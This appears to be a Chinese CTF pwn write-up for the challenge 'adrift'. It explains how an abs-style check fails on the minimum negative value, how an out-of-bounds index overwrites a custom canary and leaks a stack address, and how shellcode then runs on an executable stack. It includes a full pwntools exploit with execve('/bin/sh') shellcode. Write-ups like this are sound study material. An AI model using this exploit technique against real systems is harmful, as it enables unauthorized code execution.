# adrift

## 题目简述

题面提示 `Would you be my guiding star?`，附件是本地二进制。官方解题思路中能确定的题目机制是：程序读取一个 index 并试图把它转成正数，全局变量 `str` 的布局被刻意安排在可被异常 index 影响的位置；程序还存在自实现 canary，且栈可执行。最关键的输入边界是补码中的最小负数，取反仍等于自身，因此“转正”逻辑并不能排除这个特殊负数。

## 解题过程

程序读取 `index` 后尝试把负数转成正数，但补码最小负数取反仍等于自身。利用这个边界值，可以让下标绕过“转正”逻辑并访问到全局 `str` 附近刻意布置的区域，从而覆盖程序自实现的 canary，同时泄露栈地址。

后续利用依赖两个条件：一是 canary 可以被改成可控值，二是栈可执行。题目对 shellcode 长度限制较紧，可以复用当前寄存器状态压缩 shellcode；更稳的做法是先用短 shellcode 调 `read` 读入第二阶段。原题解使用的是短 `execve("/bin/sh")` 路线：

```python
from pwn import *
context.terminal = ['konsole', '-e', 'sh', '-c']
context(arch = 'amd64',os = 'linux',log_level = 'debug')
p = process("./vuln")
DEBUG = 'p' in sys.argv
if DEBUG:
    gdb.attach(p)
p.sendlineafter("choose> ","2")
p.sendlineafter("index> ", "-32768")
addr = p.recvuntil(b'\nchoose',drop=True)[-15:]
addr = int(addr)+0x410
log.success(hex(addr))
shellcode = asm("""
    push rdx;pop rdi;
    mov al, 0x3b
    cdq
    syscall
""")
payload = (
    b'a' * 1002 +
    p64(addr + len(shellcode)) +
    shellcode +
    b'/bin/sh\x00\x00' +
    p64(addr)
)
log.success(f"len: {len(shellcode)}")
p.sendline("3")
p.sendlineafter("index> ", "-32768")
p.sendlineafter("a new distance> ", str(addr+len(shellcode)))
p.sendlineafter("choose> ","0")
p.sendafter("way> ", payload)
p.sendlineafter("distance> ", "233")
p.interactive()
```

## 方法总结

遇到 index 取绝对值、负数过滤或 `abs(INT_MIN)` 相关逻辑，要立刻检查补码边界。Pwn WP 中应把越界能覆盖什么、泄露什么、为什么能执行 shellcode 写清楚；shellcode 空间不足时，可考虑复用寄存器状态或先 read 第二阶段。
